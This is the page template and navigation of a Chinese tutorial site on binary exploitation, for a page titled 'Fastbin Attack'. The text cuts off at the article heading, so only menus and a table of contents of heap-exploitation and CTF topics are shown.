



<!DOCTYPE html>
<html lang="zh" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      
      
      
      
        <meta name="lang:clipboard.copy" content="复制">
      
        <meta name="lang:clipboard.copied" content="已复制">
      
        <meta name="lang:search.language" content="jp">
      
        <meta name="lang:search.pipeline.stopwords" content="True">
      
        <meta name="lang:search.pipeline.trimmer" content="True">
      
        <meta name="lang:search.result.none" content="没有找到符合条件的结果">
      
        <meta name="lang:search.result.one" content="找到 1 个符合条件的结果">
      
        <meta name="lang:search.result.other" content="# 个符合条件的结果">
      
        <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
      
      <link rel="shortcut icon" href="../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-0.17.2, mkdocs-material-2.6.6">
    
    
      
        <title>Fastbin Attack - 二进制漏洞挖掘与利用</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/application.78aab2dc.css">
      
        <link rel="stylesheet" href="../../../assets/stylesheets/application-palette.6079476c.css">
      
    
    
      <script src="../../../assets/javascripts/modernizr.1aa3b519.js"></script>
    
    
      <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
      
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Fira+Sans:300,400,400i,700|Fira+Mono">
        <style>body,input{font-family:"Fira Sans","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Fira Mono","Courier New",Courier,monospace}</style>
      
      <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
    
    
      <link rel="stylesheet" href="../../../_static/css/extra.css">
    
    
  </head>
  
    
    
    <body dir="ltr" data-md-color-primary="white" data-md-color-accent="red">
  
    <svg class="md-svg">
      <defs>
        
        
      </defs>
    </svg>
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="drawer">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="search">
    <label class="md-overlay" data-md-component="overlay" for="drawer"></label>
    
      <a href="#fastbin-attack" tabindex="1" class="md-skip">
        跳转至
      </a>
    
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid">
    <div class="md-flex">
      <div class="md-flex__cell md-flex__cell--shrink">
        <a href="../../.." title="二进制漏洞挖掘与利用" class="md-header-nav__button md-logo">
          
            <i class="md-icon">school</i>
          
        </a>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        <label class="md-icon md-icon--menu md-header-nav__button" for="drawer"></label>
      </div>
      <div class="md-flex__cell md-flex__cell--stretch">
        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
          
            
              <span class="md-header-nav__topic">
                二进制漏洞挖掘与利用
              </span>
              <span class="md-header-nav__topic">
                Fastbin Attack
              </span>
            
          
        </div>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        
          
            <label class="md-icon md-icon--search md-header-nav__button" for="search"></label>
            
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
      <label class="md-icon md-search__icon" for="search"></label>
      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
        &#xE5CD;
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="result">
          <div class="md-search-result__meta">
            键入以开始搜索
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
          
        
      </div>
      
    </div>
  </nav>
</header>
    
    <div class="md-container">
      
        
      
      
        

  

<nav class="md-tabs md-tabs--active" data-md-component="tabs">
  <div class="md-tabs__inner md-grid">
    <ul class="md-tabs__list">
      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../.." title="简介" class="md-tabs__link">
          简介
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../stackoverflow/stack_intro/" title="栈溢出" class="md-tabs__link">
          栈溢出
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../fmtstr/fmtstr_intro/" title="格式化字符串漏洞" class="md-tabs__link">
          格式化字符串漏洞
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../introduction/" title="堆利用" class="md-tabs__link md-tabs__link--active">
          堆利用
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../io_file/introduction/" title="IO_FILE 利用" class="md-tabs__link">
          IO_FILE 利用
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../race-condition/introduction/" title="条件竞争" class="md-tabs__link">
          条件竞争
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../lab/6.1.1_pwn_hctf2016_brop/" title="练习" class="md-tabs__link">
          练习
        </a>
      
    </li>
  

      
    </ul>
  </div>
</nav>
      
      <main class="md-main">
        <div class="md-main__inner md-grid" data-md-component="container">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <nav class="md-nav md-nav--primary" data-md-level="0">
  <label class="md-nav__title md-nav__title--site" for="drawer">
    <span class="md-nav__button md-logo">
      
        <i class="md-icon">school</i>
      
    </span>
    二进制漏洞挖掘与利用
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-1" type="checkbox" id="nav-1">
    
    <label class="md-nav__link" for="nav-1">
      简介
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-1">
        简介
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../.." title="简介" class="md-nav__link">
      简介
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">
    
    <label class="md-nav__link" for="nav-2">
      栈溢出
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-2">
        栈溢出
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../stackoverflow/stack_intro/" title="栈介绍" class="md-nav__link">
      栈介绍
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../stackoverflow/stackoverflow_basic/" title="栈溢出原理" class="md-nav__link">
      栈溢出原理
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../stackoverflow/basic_rop/" title="基本 ROP" class="md-nav__link">
      基本 ROP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../stackoverflow/others/" title="花式栈溢出技巧" class="md-nav__link">
      花式栈溢出技巧
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../stackoverflow/medium_rop/" title="中级 ROP" class="md-nav__link">
      中级 ROP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../stackoverflow/advanced_rop/" title="高级 ROP" class="md-nav__link">
      高级 ROP
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
    
    <label class="md-nav__link" for="nav-3">
      格式化字符串漏洞
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-3">
        格式化字符串漏洞
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../fmtstr/fmtstr_intro/" title="格式化字符串漏洞原理介绍" class="md-nav__link">
      格式化字符串漏洞原理介绍
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../fmtstr/fmtstr_exploit/" title="格式化字符串漏洞利用" class="md-nav__link">
      格式化字符串漏洞利用
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../fmtstr/fmtstr_example/" title="格式化字符串漏洞例子" class="md-nav__link">
      格式化字符串漏洞例子
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../fmtstr/fmtstr_detect/" title="格式化字符串漏洞检测" class="md-nav__link">
      格式化字符串漏洞检测
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-5" type="checkbox" id="nav-3-5">
    
    <label class="md-nav__link" for="nav-3-5">
      实验
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-5">
        实验
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../fmtstr/example/picoctf-2014-guess/Write-up_cn/" title="picoctf-2014 guess" class="md-nav__link">
      picoctf-2014 guess
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4" checked>
    
    <label class="md-nav__link" for="nav-4">
      堆利用
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-4">
        堆利用
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../introduction/" title="堆利用简介" class="md-nav__link">
      堆利用简介
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../heap_overview/" title="堆概述" class="md-nav__link">
      堆概述
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../heap_structure/" title="堆相关数据结构" class="md-nav__link">
      堆相关数据结构
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../heap_implementation_details/" title="深入理解堆的实现" class="md-nav__link">
      深入理解堆的实现
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../heapoverflow_basic/" title="堆溢出" class="md-nav__link">
      堆溢出
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../off_by_one/" title="堆中的 Off-By-One" class="md-nav__link">
      堆中的 Off-By-One
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../unlink/" title="Unlink" class="md-nav__link">
      Unlink
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../use_after_free/" title="Use After Free" class="md-nav__link">
      Use After Free
    </a>
  </li>

        
          
          
          

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="toc">
    
      
    
    
      <label class="md-nav__link md-nav__link--active" for="toc">
        Fastbin Attack
      </label>
    
    <a href="./" title="Fastbin Attack" class="md-nav__link md-nav__link--active">
      Fastbin Attack
    </a>
    
      
<nav class="md-nav md-nav--secondary">
  
  
    
  
  
    <label class="md-nav__title" for="toc">目录</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#_1" title="介绍" class="md-nav__link">
    介绍
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_2" title="原理" class="md-nav__link">
    原理
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#fastbin-double-free" title="Fastbin Double Free" class="md-nav__link">
    Fastbin Double Free
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_3" title="介绍" class="md-nav__link">
    介绍
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_4" title="演示" class="md-nav__link">
    演示
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_5" title="小总结" class="md-nav__link">
    小总结
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#house-of-spirit" title="House Of Spirit" class="md-nav__link">
    House Of Spirit
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_6" title="介绍" class="md-nav__link">
    介绍
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_7" title="演示" class="md-nav__link">
    演示
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_8" title="小总结" class="md-nav__link">
    小总结
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#alloc-to-stack" title="Alloc to Stack" class="md-nav__link">
    Alloc to Stack
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_9" title="介绍" class="md-nav__link">
    介绍
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_10" title="演示" class="md-nav__link">
    演示
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_11" title="小总结" class="md-nav__link">
    小总结
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#arbitrary-alloc" title="Arbitrary Alloc" class="md-nav__link">
    Arbitrary Alloc
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_12" title="介绍" class="md-nav__link">
    介绍
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_13" title="演示" class="md-nav__link">
    演示
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_14" title="小总结" class="md-nav__link">
    小总结
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#2014-hacklu-oreo" title="2014 hack.lu oreo" class="md-nav__link">
    2014 hack.lu oreo
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_15" title="基本分析" class="md-nav__link">
    基本分析
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_16" title="基本功能" class="md-nav__link">
    基本功能
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_17" title="利用" class="md-nav__link">
    利用
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#2015-9447-ctf-search-engine" title="2015 9447 CTF : Search Engine" class="md-nav__link">
    2015 9447 CTF : Search Engine
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_18" title="基本信息" class="md-nav__link">
    基本信息
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_19" title="基本功能" class="md-nav__link">
    基本功能
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_20" title="词语结构体" class="md-nav__link">
    词语结构体
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_21" title="堆内存相关操作" class="md-nav__link">
    堆内存相关操作
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_22" title="漏洞" class="md-nav__link">
    漏洞
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_23" title="利用" class="md-nav__link">
    利用
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_24" title="利用思路" class="md-nav__link">
    利用思路
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#libc" title="泄漏 libc 地址" class="md-nav__link">
    泄漏 libc 地址
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#fastbin" title="构造 fastbin 循环链表" class="md-nav__link">
    构造 fastbin 循环链表
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#malloc_hook-chunk" title="分配 malloc_hook 附近chunk" class="md-nav__link">
    分配 malloc_hook 附近chunk
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#shell" title="shell" class="md-nav__link">
    shell
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#2017-0ctf-babyheap" title="2017 0ctf babyheap" class="md-nav__link">
    2017 0ctf babyheap
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_25" title="基本信息" class="md-nav__link">
    基本信息
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_26" title="基本功能" class="md-nav__link">
    基本功能
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_27" title="利用思路" class="md-nav__link">
    利用思路
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#libc_1" title="泄漏 libc 基地址" class="md-nav__link">
    泄漏 libc 基地址
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#chunkmalloc_hook" title="分配chunk到malloc_hook附近" class="md-nav__link">
    分配chunk到malloc_hook附近
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_28" title="题目" class="md-nav__link">
    题目
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_29" title="参考文献" class="md-nav__link">
    参考文献
  </a>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
    
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../chunk_extend_shrink/" title="Chunk Extend / Shrink" class="md-nav__link">
      Chunk Extend / Shrink
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../house_of_einherjar/" title="House Of Einherjar" class="md-nav__link">
      House Of Einherjar
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../house_of_lore/" title="House of Lore" class="md-nav__link">
      House of Lore
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../house_of_force/" title="House Of Force" class="md-nav__link">
      House Of Force
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../unsorted_bin_attack/" title="Unsorted Bin Attack" class="md-nav__link">
      Unsorted Bin Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../house_of_orange/" title="House of Orange" class="md-nav__link">
      House of Orange
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5">
    
    <label class="md-nav__link" for="nav-5">
      IO_FILE 利用
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-5">
        IO_FILE 利用
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../io_file/introduction/" title="FILE 文件结构介绍" class="md-nav__link">
      FILE 文件结构介绍
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../io_file/fake-vtable-exploit/" title="伪造 vtable 劫持程序流程" class="md-nav__link">
      伪造 vtable 劫持程序流程
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../io_file/fsop/" title="FSOP" class="md-nav__link">
      FSOP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../io_file/exploit-in-libc2.24/" title="新版本 libc 下 IO_FILE 的利用" class="md-nav__link">
      新版本 libc 下 IO_FILE 的利用
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6" type="checkbox" id="nav-6">
    
    <label class="md-nav__link" for="nav-6">
      条件竞争
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-6">
        条件竞争
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../race-condition/introduction/" title="条件竞争介绍" class="md-nav__link">
      条件竞争介绍
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../race-condition/problem/" title="例题" class="md-nav__link">
      例题
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7" type="checkbox" id="nav-7">
    
    <label class="md-nav__link" for="nav-7">
      练习
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-7">
        练习
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../lab/6.1.1_pwn_hctf2016_brop/" title="HCTF2016 brop" class="md-nav__link">
      HCTF2016 brop
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../lab/6.1.2_pwn_njctf2017_pingme/" title="NJCTF2017 pingme" class="md-nav__link">
      NJCTF2017 pingme
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../lab/6.1.3_pwn_xdctf2015_pwn200/" title="XDCTF2015 pwn200" class="md-nav__link">
      XDCTF2015 pwn200
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../lab/6.1.4_pwn_backdoorctf2017_fun_signals/" title="BackdoorCTF2017 Fun-Signals" class="md-nav__link">
      BackdoorCTF2017 Fun-Signals
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../lab/6.1.5_pwn_grehackctf2017_beerfighter/" title="GreHackCTF2017 beerfighter" class="md-nav__link">
      GreHackCTF2017 beerfighter
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../lab/6.1.6_pwn_defconctf2015_fuckup/" title="DefconCTF2015 fuckup" class="md-nav__link">
      DefconCTF2015 fuckup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../lab/6.1.7_pwn_0ctf2015_freenote/" title="0CTF2015 freenote" class="md-nav__link">
      0CTF2015 freenote
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../lab/6.1.8_pwn_dctf2017_flex/" title="DCTF2017 Flex" class="md-nav__link">
      DCTF2017 Flex
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../lab/6.1.9_rhme3_exploitation/" title="RHme3 Exploitation" class="md-nav__link">
      RHme3 Exploitation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../lab/6.1.10_0ctf2017_babyheap2017/" title="0CTF2017 BabyHeap2017" class="md-nav__link">
      0CTF2017 BabyHeap2017
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../lab/6.1.11_9447ctf2015_search_engine/" title="9447CTF2015 Search-Engine" class="md-nav__link">
      9447CTF2015 Search-Engine
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary">
  
  
    
  
  
    <label class="md-nav__title" for="toc">目录</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#_1" title="介绍" class="md-nav__link">
    介绍
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_2" title="原理" class="md-nav__link">
    原理
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#fastbin-double-free" title="Fastbin Double Free" class="md-nav__link">
    Fastbin Double Free
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_3" title="介绍" class="md-nav__link">
    介绍
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_4" title="演示" class="md-nav__link">
    演示
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_5" title="小总结" class="md-nav__link">
    小总结
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#house-of-spirit" title="House Of Spirit" class="md-nav__link">
    House Of Spirit
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_6" title="介绍" class="md-nav__link">
    介绍
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_7" title="演示" class="md-nav__link">
    演示
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_8" title="小总结" class="md-nav__link">
    小总结
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#alloc-to-stack" title="Alloc to Stack" class="md-nav__link">
    Alloc to Stack
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_9" title="介绍" class="md-nav__link">
    介绍
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_10" title="演示" class="md-nav__link">
    演示
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_11" title="小总结" class="md-nav__link">
    小总结
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#arbitrary-alloc" title="Arbitrary Alloc" class="md-nav__link">
    Arbitrary Alloc
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_12" title="介绍" class="md-nav__link">
    介绍
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_13" title="演示" class="md-nav__link">
    演示
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_14" title="小总结" class="md-nav__link">
    小总结
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#2014-hacklu-oreo" title="2014 hack.lu oreo" class="md-nav__link">
    2014 hack.lu oreo
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_15" title="基本分析" class="md-nav__link">
    基本分析
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_16" title="基本功能" class="md-nav__link">
    基本功能
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_17" title="利用" class="md-nav__link">
    利用
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#2015-9447-ctf-search-engine" title="2015 9447 CTF : Search Engine" class="md-nav__link">
    2015 9447 CTF : Search Engine
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_18" title="基本信息" class="md-nav__link">
    基本信息
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_19" title="基本功能" class="md-nav__link">
    基本功能
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_20" title="词语结构体" class="md-nav__link">
    词语结构体
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_21" title="堆内存相关操作" class="md-nav__link">
    堆内存相关操作
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_22" title="漏洞" class="md-nav__link">
    漏洞
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_23" title="利用" class="md-nav__link">
    利用
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_24" title="利用思路" class="md-nav__link">
    利用思路
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#libc" title="泄漏 libc 地址" class="md-nav__link">
    泄漏 libc 地址
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#fastbin" title="构造 fastbin 循环链表" class="md-nav__link">
    构造 fastbin 循环链表
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#malloc_hook-chunk" title="分配 malloc_hook 附近chunk" class="md-nav__link">
    分配 malloc_hook 附近chunk
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#shell" title="shell" class="md-nav__link">
    shell
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#2017-0ctf-babyheap" title="2017 0ctf babyheap" class="md-nav__link">
    2017 0ctf babyheap
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_25" title="基本信息" class="md-nav__link">
    基本信息
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_26" title="基本功能" class="md-nav__link">
    基本功能
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_27" title="利用思路" class="md-nav__link">
    利用思路
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#libc_1" title="泄漏 libc 基地址" class="md-nav__link">
    泄漏 libc 基地址
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#chunkmalloc_hook" title="分配chunk到malloc_hook附近" class="md-nav__link">
    分配chunk到malloc_hook附近
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_28" title="题目" class="md-nav__link">
    题目
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_29" title="参考文献" class="md-nav__link">
    参考文献
  </a>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                
                <h1 id="fastbin-attack">Fastbin Attack<a class="headerlink" href="#fastbin-attack" title="Permanent link">&para;</a></h1>
